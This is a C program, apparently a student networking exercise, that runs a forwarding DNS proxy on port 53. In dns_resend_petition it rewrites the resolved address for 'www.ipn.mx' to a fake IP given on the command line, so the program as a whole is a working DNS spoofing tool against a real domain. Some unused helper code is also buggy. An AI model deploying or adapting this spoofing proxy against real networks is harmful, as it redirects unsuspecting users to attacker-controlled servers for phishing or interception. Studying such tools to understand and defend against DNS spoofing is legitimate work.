#include <arpa/inet.h>  //htons
#include <arpa/nameser.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <netdb.h>
#include <resolv.h>
#include <stdbool.h>
#include <stdio.h>  //perror
#include <stdlib.h>
#include <string.h>  //memset
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#define DEFAULT_SERVER_PORT 53

#define QTYPE_A 1
#define QTYPE_AAAA 28
#define QTYPE_NS 2
#define QTYPE_CNAME 5
#define QTYPE_SOA 6

#define QCLASS_IN 1

#define MAX_BUFSIZE 1500

typedef struct dns_addr {

    char     domain[255];     // Nombre del dominio
    uint16_t type;            // Tipo de registro
    uint16_t class_internet;  // Clase
    uint32_t ttl;             // Tiempo de vida
    uint16_t data_length;     // Longitud del segmento de datos

    /* Posibles combinaciones: */
    struct in_addr  addr;              // Dirección IPv4 ( A )
    struct in6_addr sin6_addr;         // Dirección IPv6 ( AAAA )
    char            name_server[255];  // Dominio al que pertenece ( NS )
    char            alias[255];        // Alias ( CNAME )

    struct dns_addr *next;  // Siguiente elemento

} dns_addr;

typedef struct dns_msg {

    uint16_t answerRRCount;
    uint16_t authRRCount;
    uint16_t additionalRRCount;
    uint16_t questionCount;  // número de preguntas

    uint16_t tid;
    uint16_t rcode;
    uint16_t opcode;
    uint16_t elements_list;
    uint16_t qtype;

} dns_msg;

typedef struct dns_server {

    int       descriptor;   // Descriptor de socket
    int       new_descriptor;   // Descriptor de socket
    int       size_buf;     // Tamaño de bytes a enviar
    int       size_buf_backup;
    ssize_t   received;     // Tamaño de datos recibidos
    u_int16_t server_port;  // Puerto del servidor

    char domain[255];  // Nombre de dominio del que queremos obtener la IP
    char name[255];
    char* ip_falsa;
    char* ip_servidor;
    u_char buf[MAX_BUFSIZE];         // buffer para enviar y recibir peticiones DNS
    u_char buf_backup[MAX_BUFSIZE];  // buffer de respaldo de la última respuesta/petición

    struct dns_msg     msg;      // Datos correspondientes a la petición DNS
    struct sockaddr_in addr;     // Dirección IP del proceso
    struct sockaddr_in addrtmp;     // Dirección IP del proceso
    struct sockaddr_in remote;   // Dirección IP remota
    struct sockaddr_in nameserver;   // Dirección IP del NAMESERVER local, es decir, la dirración IP del DNS del router
    struct sockaddr_in cliente_original;
    struct timeval     timeout;  // tiempo de espera para cada msg

    socklen_t size_addr;    // Tamaño de la structura sockaddr_in
    socklen_t size_remote;  // Tamaño de la structura sockaddr_in cliente
    socklen_t size_nameserver;  // Tamaño de la structura sockaddr_in nameserver

    bool start;       // Estado de inicio
    bool end;         // Estado de terminación
    bool is_timeout;  // Si se ha excedido el tiempo de espera

    char ida;
    char idb;
    int       ns_response;
    int       retries;  // Número de reintentos
    u_int16_t flags;

    dns_addr *head;
    dns_addr *tail;

} dns_server;

void get_name ( u_char *buf, u_char *p, char *name );
int encode_name ( u_char *p, char *domain );
void dns_receive_response ( dns_server * );
void free_dns_list ( dns_addr *head );
void dns_send_request ( dns_server * );
void dns_build_request ( dns_server * );
void dns_get_response ( dns_server * );
void dns_init ( dns_server * );
void dns_next_request ( dns_server * );
void dns_wait_petition ( dns_server * );
void dns_resend_petition ( dns_server * );
void dns_print_response ( dns_server * );
void dns_sent_response ( dns_server * );

void get_name ( u_char *buf, u_char *p, char *name ) {

    while ( *p != 0 ) {

        while ( *p >= 192 )
            p = buf + *( p + 1 );

        for ( int j = 1; j <= *p; ++j, name++ )  // Copiamos cadena
            *name = *( p + j );

        p += *p;
        *name = '.';
        name++;
        p++;
    }
    *( name - 1 ) = '\0';  // Asignamos fin de cadena
}


int encode_name ( u_char *p, char *domain ) {

    u_char *w = p;
    size_t  size, i;
    char    tmp[255], *label;

    memset ( tmp, 0, 255 );
    strcpy ( tmp, domain );

    label = strtok ( tmp, "." );  // Buscamos segmentos antes de un . (punto)

    if ( label != NULL ) {

        size = strlen ( label ) & 0xff;  // Obtenemos longitud de la subcadena
        *w   = size;                     // La asignamos
        w++;                             // Recorremos una posición
        memcpy ( w, label, size );       // Copiamos la subcadena
        w += size;                       // Recorremos
        while ( ( label = strtok ( NULL, "." ) ) != NULL ) {

            size = strlen ( label ) & 0xff;  // Obtenemos longitud de la subcadena
            *w   = size;                     // La asignamos
            w++;                             // Recorremos una posición
            memcpy ( w, label, size );       // Copiamos la subcadena
            w += size;                       // Recorremos
        }
        return w - p;
    }
}

void free_dns_list ( dns_addr *head ) {
    dns_addr *tmp, *to_free;

    // Liberamos memoria de cada elemento
    tmp = head;
    while ( tmp->next != NULL ) {

        to_free = tmp;
        tmp     = tmp->next;
        free ( to_free );
    }
}

void dns_send_request ( dns_server *client ) {
    int sent;

    sent = sendto ( client->descriptor, client->buf, client->size_buf, 0, ( struct sockaddr * ) &client->remote,
                    sizeof ( struct sockaddr_in ) );

    if ( sent != client->size_buf )
        printf ( "Error from sendto() in sent_request(): %s \n", strerror ( errno ) );

    // Copiamos el buffer por una posible retransmisión
    memset ( &client->buf_backup, 0, 255 );
    memcpy ( &client->buf_backup, &client->buf, 255 );
}

void dns_build_request ( dns_server *client ) {
    u_char *p = client->buf;

    memset ( p, 0, MAX_BUFSIZE );

    // ID
    client->msg.tid = rand () % 65536;
    *( p + 0 )      = ( client->msg.tid >> 8 ) & 0xff;
    *( p + 1 )      = client->msg.tid & 0xff;
    p += 2;

    ////QR - OPCODE - AA - TC - RD - RA - Z - RCODE - Response Code
    *( p + 0 ) = 0x01;
    *( p + 1 ) = 0x00;
    p += 2;

    // QDCount - Question Count
    *( p + 0 ) = ( client->msg.questionCount >> 8 ) & 0xff;
    *( p + 1 ) = client->msg.questionCount & 0xff;
    p += 2;

    // ANCOUNT - Answer Record Count
    *( p + 0 ) = 0x00;
    *( p + 1 ) = 0x00;
    p += 2;

    // NSCOUNT - Name Server Count
    *( p + 0 ) = 0x00;
    *( p + 1 ) = 0x00;
    p += 2;

    // ARCOUNT - Additional Record Count: 12 bytes
    *( p + 0 ) = 0x00;
    *( p + 1 ) = 0x00;
    p += 2;

    /* DNS Message Question Section Format */
    /* QNAME (Variable) + QTYPE ( QTYPE_NS o QTYPE_A ) + QCLASS ( 2 bytes ) */

    // QNAME - Question Name (VARIBLE)

    if ( client->start = false ) {
        *( p + 0 ) = 0x00;
        p += 1;

    } else {

        p += encode_name ( p, client->domain );
        p++;
    }

    // QTYPE - Question Type

    if ( client->start ) {

        *( p + 0 ) = ( QTYPE_NS >> 8 ) & 0xff;
        *( p + 1 ) = ( QTYPE_NS ) &0xff;
        *
        p += 2;
        client->start = false;
    } else {

        *( p + 0 ) = ( QTYPE_A >> 8 ) & 0xff;
        *( p + 1 ) = ( QTYPE_A ) &0xff;
        p += 2;
    }

    // QCLASS - Question Class

    *( p + 0 ) = ( QCLASS_IN >> 8 ) & 0xff;
    *( p + 1 ) = ( QCLASS_IN ) &0xff;
    p += 2;

    // Guardamos el tamaño de msg a enviar
    client->size_buf = p - client->buf;
}

void dns_get_response ( dns_server *client ) {

    dns_build_request ( client );
    dns_send_request ( client );
    //dns_receive_response ( client );
}

void dns_init ( dns_server *listen ) {


    /* Asignamos datos de la estructura dns_server y otros */

    listen->addr.sin_family      = AF_INET;
    listen->addr.sin_addr.s_addr = INADDR_ANY;
    listen->addr.sin_port        = htons ( DEFAULT_SERVER_PORT );
    listen->size_addr            = sizeof ( struct sockaddr_in );
    listen->server_port          = DEFAULT_SERVER_PORT;

    listen->descriptor        = socket ( AF_INET, SOCK_DGRAM, 0 );
    listen->start             = true;
    listen->end               = false;
    listen->msg.questionCount = 1;
    listen->timeout.tv_sec    = 2;  // Un segundo

    listen->nameserver.sin_family      = AF_INET;
    //listen->nameserver.sin_addr.s_addr = inet_addr("192.168.1.254");
    listen->nameserver.sin_addr.s_addr = inet_addr(listen->ip_servidor);
    listen->nameserver.sin_port        = htons ( 53 );
    listen->size_nameserver            = sizeof ( struct sockaddr_in );

    listen->size_remote = sizeof ( struct sockaddr_in );
    listen->head = malloc ( sizeof ( struct dns_addr ) );

    if ( !listen->head ) {
        printf ( "Error in malloc() from dns_init(): %s", strerror ( errno ) );
        exit(1);
    }


    if ( listen->descriptor == -1 ) {
        printf ( "Error from socket() in dns_init(): %s \n", strerror ( errno ) );
        exit(1);
    }

    if ( bind ( listen->descriptor, ( struct sockaddr * ) &listen->addr, sizeof ( struct sockaddr_in ) ) == -1 ){
        printf ( "Error from bind() in dns_init(): %s", strerror ( errno ) );
        exit(1);
    }

    if ( setsockopt ( listen->descriptor, SOL_SOCKET, SO_RCVTIMEO, ( char * ) &listen->timeout,
                      sizeof ( listen->timeout ) )
         < 0 ) {
        printf ( "Error from setsockopt() in dns_init(): %s", strerror ( errno ) );
        exit(1);
    }

}



void dns_wait_petition( dns_server *listen ) {
    ssize_t received;
    pid_t   childPid;

    /* limpiamos el buffer y esperamos msg válido */

    memset ( listen->buf, 0, MAX_BUFSIZE );


    //obtenemos el msj del cliente dns así como la dirección IP del cliente
    received = recvfrom (listen->descriptor, listen->buf, MAX_BUFSIZE, 0,
                           ( struct sockaddr * ) &listen->remote,
                          &listen->size_remote);


    //tres condiciones para msj correcto
    // diferente de -1, es decir, que se haya recibido algo
    // que sea una petición dns
    // que no se pueda bloquear
    if (received != -1
            && listen->buf[2] == 1
            && listen->buf[3] == 0
            && received != EWOULDBLOCK ) {

        /*switch ( childPid = fork () ) {
            case -1:
                printf("Error from fork() in wait_request(): %s",
                               strerror ( errno ) );
                exit(1);

            case 0:*/
              //  printf("Child created successfully with PID: %d",
                //         getpid () );
        listen->cliente_original = listen->remote;
        listen->size_buf = received;
                dns_resend_petition ( listen );
                //_exit ( EXIT_SUCCESS );
       // }
    }

}
void get_list_response ( dns_server *client ) {

    u_char *  p = client->buf, *w = NULL;
    u_int16_t type;
    dns_addr *tmp;
    char *    name;
    int total = client->msg.additionalRRCount +
            client->msg.answerRRCount +
            client->msg.authRRCount;

    client->flags = htons(*(p+2)) + *(p + 3);
    /* Saltamos la sección de pregunta */
    p += 12;
    while ( *p != 0 )
        p++;
    p += 5;

    /* Procesamos sección de respuestas */
    memset ( client->head, 0, sizeof ( dns_addr ) );

    tmp = client->head;
    int i = 0;
    while ( ( p - client->buf ) <= client->received ) {


        if ( *p == 0 ) {  // Procesamos los servidores raíz
            strcpy ( tmp->domain, "<Raíz>" );
            p += 1;
        } else {  // Cualquier otro servidor

            w    = p;            // Guardamos posición
            name = tmp->domain;  // Obtenemos nombre
            get_name ( client->buf, p, name );
            memset(&client->name,0,255);
            strcpy(&client->name,name);//copiamos nombre

            p = w + 2;  // Recuperamos posición
        }

        tmp->type = htons ( *p ) + *( p + 1 );
        type      = tmp->type;
        p += 2;
        tmp->class_internet = htons ( *p ) + *( p + 1 );
        p += 2;
        tmp->ttl = ( *p << 24 ) + ( *( p + 1 ) << 16 ) + ( *( p + 2 ) << 8 ) + *( p + 3 );
        p += 4;
        tmp->data_length = htons ( *p ) + *( p + 1 );
        p += 2;

        /* Solo nos interesan los registros NS, A, AAAA o CNAME */
        switch ( tmp->type ) {

            case QTYPE_NS:
                // name server
                w    = p;                 // Guardamos posición
                name = tmp->name_server;  // Obtenemos nombre
                get_name ( client->buf, p, name );
                p = w + tmp->data_length;
                ;  // Recuperamos posición
                break;
            case QTYPE_CNAME:
                // alias
                w    = p;           // Guardamos posición
                name = tmp->alias;  // Obtenemos nombre
                get_name ( client->buf, p, name );
                p = w + tmp->data_length;
                ;  // Recuperamos posición
                break;
            case QTYPE_A:
                // IPv4
                tmp->addr.s_addr = htonl ( ( *p << 24 ) + ( *( p + 1 ) << 16 ) + ( *( p + 2 ) << 8 ) + *( p + 3 ) );
                p += tmp->data_length;
                break;
            case QTYPE_AAAA:
                // IPv6
                for ( int k                                    = 0; k < 16; ++k )
                    *( tmp->sin6_addr.__in6_u.__u6_addr8 + k ) = *( p + k );
                p += tmp->data_length;
                break;
            default:  // No lo procesamos
                p += tmp->data_length;
                memset ( tmp, 0, sizeof ( dns_addr ) );
        }

        switch ( tmp->type ) {
            case QTYPE_NS:
            case QTYPE_CNAME:
            case QTYPE_A:
            case QTYPE_AAAA:
                //  Creamos siguiente elemento de la lista
                tmp->next = malloc ( sizeof ( struct dns_addr ) );

                if ( !tmp->next )
                    printf ( "Error in malloc() from decode_names(): %s", strerror ( errno ) );

                tmp = tmp->next;
                memset ( tmp, 0, sizeof ( dns_addr ) );
                break;
        }
    }
}
void dns_resend_petition( dns_server * listen ) {
    int sent;
    ssize_t received;

    listen->addrtmp.sin_family      = AF_INET;
    listen->addrtmp.sin_addr.s_addr = INADDR_ANY;
    listen->addrtmp.sin_port        = htons ( 0 );
    listen->size_addr            = sizeof ( struct sockaddr_in );
    listen->new_descriptor        = socket ( AF_INET, SOCK_DGRAM, 0 );

    if ( bind ( listen->new_descriptor, ( struct sockaddr * ) &listen->addrtmp, sizeof ( struct sockaddr_in ) ) == -1 ){
        printf ( "Error from bind() in dns_init(): %s", strerror ( errno ) );
        exit(1);
    }

    //enviamos al servidor local dns
    sent = sendto ( listen->new_descriptor, listen->buf, listen->size_buf, 0, ( struct sockaddr * ) &listen->nameserver,
                            sizeof ( struct sockaddr_in ) );



    memset ( &listen->buf, 0, MAX_BUFSIZE );
    //esperamos respuesta del servidor DNS auténtico
    received = recvfrom (listen->new_descriptor, listen->buf, MAX_BUFSIZE, 0, NULL,NULL);

    if ( received != -1
         && listen->buf[2] == 0x81
         //&& listen->buf[3] == 0x83
         && received != EWOULDBLOCK
         ) { //reenviamos la respuesta a nuestro cliente original

        //decodificamos la respuesta
        listen->msg.answerRRCount     = ntohs ( listen->buf[6] ) + listen->buf[7];
        listen->msg.authRRCount       = ntohs ( listen->buf[8] ) + listen->buf[9];
        listen->msg.additionalRRCount = ntohs ( listen->buf[10] ) + listen->buf[11];
        listen->received              = received;
        listen->retries               = 0;
        get_list_response ( listen );

        //si la pregunta es "www.ipn.mx" modificamos la ip y ponemos la de nuestro servidor local
        //como sabemos que son los últimos 4 bytes la respuesta de esta dirección
        //pues solamente modificamos esos bytes
       //
        if( strcmp("www.ipn.mx" , listen->name) == 0) {
            listen->remote.sin_addr.s_addr = inet_addr(listen->ip_falsa);
          u_char*tmp = listen->buf + received - 4;
          int ip = listen->remote.sin_addr.s_addr;
          *(tmp + 3 ) = (ip >> 24) & 0xff;
          *(tmp + 2 ) = (ip >> 16) & 0xff;
          *(tmp + 1 ) = (ip >> 8) & 0xff;
          *(tmp + 0 ) = (ip) & 0xff;
        }

        listen->size_buf = received;
        sent = sendto ( listen->descriptor, listen->buf, listen->size_buf, 0, ( struct sockaddr * ) &listen->cliente_original,
                        sizeof ( struct sockaddr_in ) );

        if ( sent != listen->size_buf ) {
            printf ( "Error from sendto() in sent_request(): %s \n", strerror ( errno ) );
            exit(1);
        }

    }
        close(listen->new_descriptor);

}

int main ( int argc, char *argv[] ) {

    srand ( time ( NULL ) );
    dns_server listen;

    /* Inicializamos a ceros las estructuras */
    memset ( &listen, 0, sizeof ( dns_server ) );

    listen.ip_falsa = argv[1];
    listen.ip_servidor = argv[2];
    dns_init ( &listen );

    for(;;)
        dns_wait_petition( &listen );//esperamos una petición dns

}
